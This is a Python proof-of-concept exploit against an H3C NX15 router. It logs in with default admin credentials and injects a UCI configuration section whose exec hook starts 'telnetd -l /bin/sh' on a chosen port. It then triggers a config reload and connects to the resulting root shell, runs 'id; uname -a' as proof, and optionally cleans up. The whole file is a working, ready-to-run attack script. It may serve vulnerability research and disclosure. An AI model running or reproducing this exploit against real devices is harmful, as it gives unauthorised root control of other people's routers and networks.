#!/usr/bin/env python3
import argparse
import json
import socket
import sys
import time
from typing import Any

import requests


def log(msg: str) -> None:
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(base.rstrip('/') + '/api/login/auth', json={'username': username, 'password': password}, timeout=10)
    r.raise_for_status()
    j = r.json()
    if j.get('code') != 0:
        raise RuntimeError(f'login failed: {j}')
    return j['data']['session']


def esps(base: str, session: str, obj: str, method: str, param: dict[str, Any], timeout: int = 20):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    payload = [{'id': 1, 'object': obj, 'method': method, 'param': param}]
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(payload), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def connect_shell(host: str, port: int, timeout: float = 5.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    time.sleep(0.3)
    banner = b''
    try:
        banner += s.recv(4096)
    except Exception:
        pass
    return s, banner


def run_shell_cmd(sock: socket.socket, cmd: str, end_marker: str = '__END__') -> str:
    sock.sendall(f'{cmd}; echo {end_marker}\n'.encode())
    time.sleep(0.7)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if end_marker.encode() in data or len(data) > 65535:
                break
    except Exception:
        pass
    return data.decode('latin1', 'ignore')


def cleanup_shell_via_helper(host: str, helper_ports: list[int], target_port: int) -> None:
    helper = None
    for p in helper_ports:
        try:
            helper, _ = connect_shell(host, p, timeout=3.0)
            break
        except Exception:
            continue
    if helper is None:
        log(f'[!] cleanup: no helper shell on {helper_ports}')
        return
    awk_pat = f'/telnetd -p{target_port}/ && !/awk/ {{print $1}}'
    out = run_shell_cmd(helper, f'pid=$(ps w | awk \'{awk_pat}\'); [ -n "$pid" ] && kill "$pid"; echo cleaned')
    log('[*] cleanup helper output:')
    print(out)
    helper.close()


def main() -> int:
    ap = argparse.ArgumentParser(description='H3C NX15 R017 post-auth root RCE via raw ubus uci.add + reload.reload_config')
    ap.add_argument('--base', default='http://192.168.8.1')
    ap.add_argument('--username', default='admin')
    ap.add_argument('--password', default='admin123')
    ap.add_argument('--host', default='192.168.8.1')
    ap.add_argument('--section', default='pocx', help='temporary smartwaretrack section name')
    ap.add_argument('--port', type=int, default=2351, help='temporary telnetd shell port')
    ap.add_argument('--cleanup', action='store_true', help='delete temporary section and kill spawned telnetd after verification')
    args = ap.parse_args()

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    log('[*] Step 2: delete previous smartwaretrack section if any')
    try:
        esps(args.base, session, 'uci', 'delete', {'config': 'smartwaretrack', 'section': args.section})
        esps(args.base, session, 'uci', 'commit', {'config': 'smartwaretrack'})
    except Exception:
        pass

    log('[*] Step 3: add malicious smartwaretrack section with exec hook')
    add_resp = esps(
        args.base,
        session,
        'uci',
        'add',
        {
            'config': 'smartwaretrack',
            'type': 'ctf',
            'name': args.section,
            'values': {'exec': f'telnetd -p{args.port} -l /bin/sh'},
        },
    )
    print(json.dumps(add_resp, ensure_ascii=False, indent=2) if not isinstance(add_resp, str) else add_resp)
    esps(args.base, session, 'uci', 'commit', {'config': 'smartwaretrack'})

    log('[*] Step 4: trigger safe reload path on attacker-controlled section')
    reload_resp = esps(
        args.base,
        session,
        'reload',
        'reload_config',
        {'config': args.section, 'method': 'reload', 'status': 1},
    )
    print(json.dumps(reload_resp, ensure_ascii=False, indent=2) if not isinstance(reload_resp, str) else reload_resp)
    time.sleep(1.5)

    log('[*] Step 5: connect spawned root shell')
    sock, banner = connect_shell(args.host, args.port)
    print(banner.decode('latin1', 'ignore'))
    proof = run_shell_cmd(sock, 'id; uname -a')
    print(proof)
    ok = 'uid=0(root)' in proof
    sock.close()

    if args.cleanup:
        log('[*] Step 6: cleanup temporary section and shell')
        try:
            esps(args.base, session, 'uci', 'delete', {'config': 'smartwaretrack', 'section': args.section})
            esps(args.base, session, 'uci', 'commit', {'config': 'smartwaretrack'})
        except Exception:
            pass
        cleanup_shell_via_helper(args.host, [2330, 2323], args.port)

    if ok:
        log('[+] SUCCESS: obtained root RCE via uci.add + reload.reload_config')
        return 0

    log('[-] FAILED: expected root proof was not observed')
    return 1


if __name__ == '__main__':
    sys.exit(main())
